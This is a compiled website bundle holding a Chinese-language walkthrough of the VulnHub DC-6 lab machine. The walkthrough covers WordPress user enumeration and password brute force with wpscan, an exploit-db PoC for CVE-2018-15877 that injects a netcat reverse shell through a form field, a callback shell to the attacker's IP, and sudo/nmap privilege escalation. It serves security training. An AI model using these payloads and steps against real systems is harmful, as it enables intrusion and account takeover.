"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[4180],{5455:(n,e,r)=>{r.r(e),r.d(e,{assets:()=>d,contentTitle:()=>l,default:()=>o,frontMatter:()=>a,metadata:()=>s,toc:()=>t});const s=JSON.parse('{"id":"VulnHub/Virtual Machines/DC-6","title":"DC-6","description":"DC-6\u9776\u573a","source":"@site/docs/VulnHub/Virtual Machines/DC-6.md","sourceDirName":"VulnHub/Virtual Machines","slug":"/VulnHub/Virtual Machines/DC-6","permalink":"/docs/VulnHub/Virtual Machines/DC-6","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/VulnHub/Virtual Machines/DC-6.md","tags":[],"version":"current","frontMatter":{},"sidebar":"VulnHubSidebar","previous":{"title":"DC-5","permalink":"/docs/VulnHub/Virtual Machines/DC-5"},"next":{"title":"DC-7","permalink":"/docs/VulnHub/Virtual Machines/DC-7"}}');var i=r(4848),c=r(8453);const a={},l=void 0,d={},t=[{value:"DC-6\u9776\u573a",id:"dc-6\u9776\u573a",level:2},{value:"\u4e3b\u673a\u626b\u63cf",id:"\u4e3b\u673a\u626b\u63cf",level:3},{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:3},{value:"\u76ee\u5f55\u626b\u63cf",id:"\u76ee\u5f55\u626b\u63cf",level:3},{value:"wpscan\u5de5\u5177\u5229\u7528",id:"wpscan\u5de5\u5177\u5229\u7528",level:3},{value:"\u767b\u5f55web\u540e\u53f0",id:"\u767b\u5f55web\u540e\u53f0",level:3},{value:"\u6f0f\u6d1e\u5229\u7528",id:"\u6f0f\u6d1e\u5229\u7528",level:3},{value:"\u63d0\u6743",id:"\u63d0\u6743",level:3},{value:"\u603b\u7ed3",id:"\u603b\u7ed3",level:2}];function h(n){const e={a:"a",blockquote:"blockquote",code:"code",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,c.R)(),...n.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(e.h2,{id:"dc-6\u9776\u573a",children:"DC-6\u9776\u573a"}),"\n",(0,i.jsx)(e.h3,{id:"\u4e3b\u673a\u626b\u63cf",children:"\u4e3b\u673a\u626b\u63cf"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"nmap -sP 192.168.56.0/24\r\nNmap scan report for wordy (192.168.56.107)\r\nHost is up (0.00016s latency).\r\nMAC Address: 08:00:27:50:FB:08 (Oracle VirtualBox virtual NIC)\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u9776\u673aip\uff1a192.168.56.107"}),"\n",(0,i.jsx)(e.h3,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"nmap -sV 192.168.56.107\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u5f00\u4e8622\uff0c80\u7aef\u53e3"}),"\n",(0,i.jsx)(e.p,{children:"\u8bbf\u95eeweb\u9875\u9762\uff0c\u53d1\u73b0\u8df3\u8f6c\u5230wordy\uff0c\u90a3\u5c31\u505a\u4e2a\u57df\u540d\u89e3\u6790"}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"vim /etc/hosts\n"})}),"\n",(0,i.jsx)(e.p,{children:"192.168.56.107 wordy"}),"\n"]}),"\n",(0,i.jsx)(e.h3,{id:"\u76ee\u5f55\u626b\u63cf",children:"\u76ee\u5f55\u626b\u63cf"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"dirb http://192.168.56.107/\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u626b\u5230\u4e86wp-admin\u76ee\u5f55"}),"\n",(0,i.jsx)(e.h3,{id:"wpscan\u5de5\u5177\u5229\u7528",children:"wpscan\u5de5\u5177\u5229\u7528"}),"\n",(0,i.jsx)(e.p,{children:"\u7f51\u7ad9\u662fwordpress\uff0c\u90a3\u6211\u4eec\u7528wpscan\u626b\u63cf\u5c31\u884c\u4e86"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"wpscan --url http://wordy\r\n\u8fd9\u6837\u626b\u7ed9\u7684\u4fe1\u606f\u4e0d\u591f\uff0c\u9700\u8981\u7528\u5230api-token\r\n[!] No WPScan API Token given, as a result vulnerability data has not been output.\n"})}),"\n",(0,i.jsxs)(e.p,{children:["\u767b\u5f55",(0,i.jsx)(e.a,{href:"https://wpscan.com/profile/",children:"wpsan\u5b98\u7f51"}),"\uff0c\u83b7\u53d6\u4e00\u4e2atoken"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"wpscan --url http://wordy --api-token 4GXx8c2FQJQdnJxTY7raHIP1NkqqDZacGoT27nss7sA --enumerate u\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u679a\u4e3e\u4e00\u4e0b\u7528\u6237\uff0c\u5f97\u5230\u4e94\u4e2a\u7528\u6237"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"admin\r\ngraham\r\nmark\r\nsarah\r\njens\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u5176\u5b9e\uff0c\u6211\u7528\u7684\u662fcmseek\u626b\u63cf\u7684\uff0c\u4e5f\u662f\u626b\u51fa\u6765\u8fd9\u4e94\u4e2a\u7528\u6237"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"cmseek -u 192.168.56.107\n"})}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240308144124363.png",alt:"image-20240308144124363"})}),"\n",(0,i.jsx)(e.p,{children:"\u7528\u6237\u540d\u6709\u4e86\uff0c\u7ee7\u7eed\u641e\u5bc6\u7801"}),"\n",(0,i.jsx)(e.p,{children:"\u4e00\u5f00\u59cb\u6211\u662f\u76f4\u63a5\u7528kali\u91cc\u9762\u7684rockyou.txt\u7206\u7834\u7684\uff0c\u6ca1\u7206\u7834\u51fa\u6765\uff08\u5bc6\u7801\u592a\u591a\u4e86\uff09"}),"\n",(0,i.jsx)(e.p,{children:"\u5b98\u7f51\u662f\u6709\u4e00\u4e2a\u63d0\u793a\u7684"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt That should save you a few years. ;-)\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u90a3\u8fd9\u4e2apasswords.txt\u5c31\u662f\u5bc6\u7801\u4e86"}),"\n",(0,i.jsx)(e.p,{children:"\u8fd9\u91cc\u6211\u76f4\u63a5\u7528wpscan\u8fdb\u884c\u7206\u7834\u4e86 -U \u6307\u5b9a\u7528\u6237\u540d -P \u6307\u5b9a\u5bc6\u7801"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"wpscan --url http://wordy -U users.txt -P passwords.txt\n"})}),"\n",(0,i.jsxs)(e.p,{children:["\u5f97\u5230\u8d26\u53f7\u5bc6\u7801\uff0c",(0,i.jsx)(e.code,{children:"Username: mark, Password: helpdesk01"})]}),"\n",(0,i.jsx)(e.h3,{id:"\u767b\u5f55web\u540e\u53f0",children:"\u767b\u5f55web\u540e\u53f0"}),"\n",(0,i.jsx)(e.p,{children:"\u767b\u5f55\u4e0a\u53bb\uff0c\u53d1\u73b0\u4e5f\u6ca1\u6709\u5199php\u7684\u5730\u65b9\uff0c\u90a3\u5c31\u627e\u4e00\u4e0b\u63d2\u4ef6\u7684\u6f0f\u6d1e"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240308145539641.png",alt:"image-20240308145539641"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"cp /usr/share/exploitdb/exploits/php/webapps/45274.html ci.html\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u5185\u5bb9"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-html",children:'\x3c!--\r\nPoC:\r\n--\x3e\r\n\r\n<html>\r\n  \x3c!--  Wordpress Plainview Activity Monitor RCE\r\n        [+] Version: 20161228 and possibly prior\r\n        [+] Description: Combine OS Commanding and CSRF to get reverse shell\r\n        [+] Author: LydA(c)ric LEFEBVRE\r\n        [+] CVE-ID: CVE-2018-15877\r\n        [+] Usage: Replace 127.0.0.1 & 9999 with you ip and port to get reverse shell\r\n        [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well\r\n  --\x3e\r\n  <body>\r\n  <script>history.pushState(\'\', \'\', \'/\')<\/script>\r\n    <form action="http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools" method="POST" enctype="multipart/form-data">\r\n      <input type="hidden" name="ip" value="google.fr| nc -nlvp 127.0.0.1 9999 -e /bin/bash" />\r\n      <input type="hidden" name="lookup" value="Lookup" />\r\n      <input type="submit" value="Submit request" />\r\n    </form>\r\n  </body>\r\n</html>\n'})}),"\n",(0,i.jsx)(e.h3,{id:"\u6f0f\u6d1e\u5229\u7528",children:"\u6f0f\u6d1e\u5229\u7528"}),"\n",(0,i.jsxs)(e.p,{children:["\u8fd9\u662f\u4e00\u4e2acsrf\u6f0f\u6d1e\u548c\u547d\u4ee4\u6ce8\u5165\uff0c\u5229\u7528",(0,i.jsx)(e.code,{children:"|"}),"\u7b26\u53f7"]}),"\n",(0,i.jsx)(e.p,{children:"history.pushState( )\u8fd9\u662f\u4e00\u4e2a\u975e\u5e38\u795e\u5947\u7684javascript\u65b9\u6cd5\uff0c\u8ba9\u9875\u9762\u65e0\u5237\u65b0\u589e\u6dfb\u6d4f\u89c8\u5668\u5386\u53f2\u8bb0\u5f55\u3002"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"\u8bed\u6cd5 history.pushState(state, title, url)\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u627e\u5230\u8fd9\u4e2a\u6f0f\u6d1e\u9875\u9762"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240308150126876.png",alt:"image-20240308150126876"})}),"\n",(0,i.jsx)(e.p,{children:"\u8fd9\u4e2a\u9875\u9762\u7684\u529f\u80fd\u6709\u4e24\u4e2a\uff0c\u4e0a\u9762\u6309\u94ae\u662f\u5c06ipv4\u8f6c\u6362\u6210\u957f\u6574\u5f62ip\uff0c\u4e0b\u9762\u7684\u6309\u94ae\u662f\u8fdb\u884c\u89e3\u6790ip"}),"\n",(0,i.jsxs)(e.p,{children:["\u5229\u7528",(0,i.jsx)(e.code,{children:"|"}),"\u8fdb\u884c\u547d\u4ee4\u6267\u884c"]}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240308150530986.png",alt:"image-20240308150530986"})}),"\n",(0,i.jsx)(e.p,{children:"\u90a3\u6211\u4eec\u63a5\u7740\u5f39shell\u5427\uff0c"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"127.0.0.1| nc -e /bin/bash 192.168.56.101 1234\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u5207\u6362\u5230home\u76ee\u5f55\uff0c"}),"\n",(0,i.jsx)(e.p,{children:"\u8fdb\u884cmark\u7684\u5bb6"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",children:"www-data@dc-6:/home/mark/stuff$ ls\r\nls\r\nthings-to-do.txt\r\nwww-data@dc-6:/home/mark/stuff$ cat t*\r\ncat t*\r\nThings to do:\r\n\r\n- Restore full functionality for the hyperdrive (need to speak to Jens)\r\n- Buy present for Sarah's farewell party\r\n- Add new user: graham - GSo7isUM1D4 - done\r\n- Apply for the OSCP course\r\n- Buy new laptop for Sarah's replacement\n"})}),"\n",(0,i.jsxs)(e.p,{children:["\u53d1\u73b0\uff0c\u7528\u6237",(0,i.jsx)(e.code,{children:"graham - GSo7isUM1D4"})]}),"\n",(0,i.jsx)(e.h3,{id:"\u63d0\u6743",children:"\u63d0\u6743"}),"\n",(0,i.jsx)(e.p,{children:"\u5148\u4e0d\u6025\uff0c\u770b\u770b\u522b\u7684\u76ee\u5f55"}),"\n",(0,i.jsx)(e.p,{children:"\u5728jens\u7684\u5bb6\u76ee\u5f55\uff0c\u53d1\u73b0\u4e00\u4e2a\u811a\u672c"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"www-data@dc-6:/home/jens$ ls -al\r\nls -al\r\ntotal 32\r\ndrwxr-xr-x 2 jens jens 4096 Mar  8 16:04 .\r\ndrwxr-xr-x 6 root root 4096 Apr 26  2019 ..\r\n-rw------- 1 jens jens    5 Apr 26  2019 .bash_history\r\n-rw-r--r-- 1 jens jens  220 Apr 24  2019 .bash_logout\r\n-rw-r--r-- 1 jens jens 3526 Apr 24  2019 .bashrc\r\n-rw-r--r-- 1 jens jens  675 Apr 24  2019 .profile\r\n-rwxrwxr-x 1 jens devs   48 Mar  8 16:10 backups.sh\n"})}),"\n",(0,i.jsx)(e.p,{children:"jens\u6240\u6709\u8005\u548cdevs\u6240\u5c5e\u7ec4\u6709rwx\u6743\u9650"}),"\n",(0,i.jsx)(e.p,{children:"\u63a5\u7740\uff0c\u5207\u6362\u5230graham\u7528\u6237"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"graham@dc-6:~$ id                                \r\nuid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs)\r\ngraham@dc-6:~$ sudo -l\r\nMatching Defaults entries for graham on dc-6:\r\n    env_reset, mail_badpass,\r\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\r\n\r\nUser graham may run the following commands on dc-6:\r\n    (jens) NOPASSWD: /home/jens/backups.sh\n"})}),"\n",(0,i.jsxs)(e.p,{children:["\u53d1\u73b0graham\u7528\u6237\u5c31\u662fdevs\u7ec4\u7684\uff0c\u5e76\u4e14\u53ef\u4ee5\u4e0d\u8981\u5bc6\u7801\u6267\u884c",(0,i.jsx)(e.code,{children:"/home/jens/backups.sh"}),"\u8fd9\u4e2a\u811a\u672c"]}),"\n",(0,i.jsx)(e.p,{children:"\u5c1d\u8bd5\u63d0\u6743\u5230jens\u7528\u6237"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"echo '/bin/bash'>>backups.sh\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u4ee5jens\u7684\u8eab\u4efd\u8fdb\u884c\u6267\u884c"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"sudo -u jens /home/jens/backups.sh\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u8fd9\u6837\u5c31\u5f97\u5230jens\u7684shell"}),"\n",(0,i.jsx)(e.p,{children:"\u63a5\u7740"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",children:"jens@dc-6:~$ id\r\nid\r\nuid=1004(jens) gid=1004(jens) groups=1004(jens),1005(devs)\r\njens@dc-6:~$ sudo -l\r\nsudo -l\r\nMatching Defaults entries for jens on dc-6:\r\n    env_reset, mail_badpass,\r\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\r\n\r\nUser jens may run the following commands on dc-6:\r\n    (root) NOPASSWD: /usr/bin/nmap\n"})}),"\n",(0,i.jsx)(e.p,{children:"jens\u7528\u6237\u53ef\u4ee5\u4f7f\u7528nmap\uff0cnmap\u8fdb\u884c\u63d0\u6743"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"echo 'os.execute(\"/bin/bash\")' > a.nse\n"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"sudo nmap --script=a.nse\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u63d0\u6743\u6210\u529f\uff0c"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240308152242079.png",alt:"image-20240308152242079"})}),"\n",(0,i.jsx)(e.h2,{id:"\u603b\u7ed3",children:"\u603b\u7ed3"}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsxs)(e.p,{children:["nmap \u63d0\u6743\u3002\u4f7f\u7528",(0,i.jsx)(e.code,{children:"--script"}),"\u53c2\u6570\u6267\u884c\u63d0\u6743\u811a\u672c"]}),"\n",(0,i.jsx)(e.p,{children:"\u5b66\u4f1awpsacn\u7684\u57fa\u672c\u4f7f\u7528\u65b9\u6cd5"}),"\n",(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.code,{children:"os.execute ([command])"}),"\u8fd9\u662flua\u4e2d\u7684\u4e00\u4e2a\u51fd\u6570\uff0c\u76f8\u5f53\u4e8e\u6267\u884c\u7cfb\u7edf\u547d\u4ee4"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"a & b   //\u5148\u6267\u884ca\u518d\u6267\u884cb\uff0c\u65e0\u8bbaa\u662f\u5426\u6267\u884c\u6210\u529f(\u6309\u4f4d\u4e0e)\r\na && b  //\u5148\u6267\u884ca\u518d\u6267\u884cb\uff0c\u53ea\u6709a\u6267\u884c\u6210\u529f\u624d\u4f1a\u6267\u884cb(\u903b\u8f91\u4e0e)\r\na || b  //\u5148\u6267\u884ca\u518d\u6267\u884cb\uff0c\u53ea\u6709a\u6267\u884c\u5931\u8d25\u624d\u4f1a\u6267\u884cb(\u903b\u8f91\u6216)\r\na | b   //\u5c06a\u7684\u6267\u884c\u7ed3\u679c\u4f20\u9012\u7ed9b(\u7ba1\u9053\u7b26)\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u9776\u673a\u6d89\u53ca\u77e5\u8bc6\u70b9\uff1a"}),"\n",(0,i.jsx)(e.p,{children:"\u66b4\u529b\u7834\u89e3\uff0ccsrf\uff0c\u547d\u4ee4\u6267\u884c"}),"\n"]})]})}function o(n={}){const{wrapper:e}={...(0,c.R)(),...n.components};return e?(0,i.jsx)(e,{...n,children:(0,i.jsx)(h,{...n})}):h(n)}},8453:(n,e,r)=>{r.d(e,{R:()=>a,x:()=>l});var s=r(6540);const i={},c=s.createContext(i);function a(n){const e=s.useContext(c);return s.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function l(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(i):n.components||i:a(n.components),s.createElement(c.Provider,{value:e},n.children)}}}]);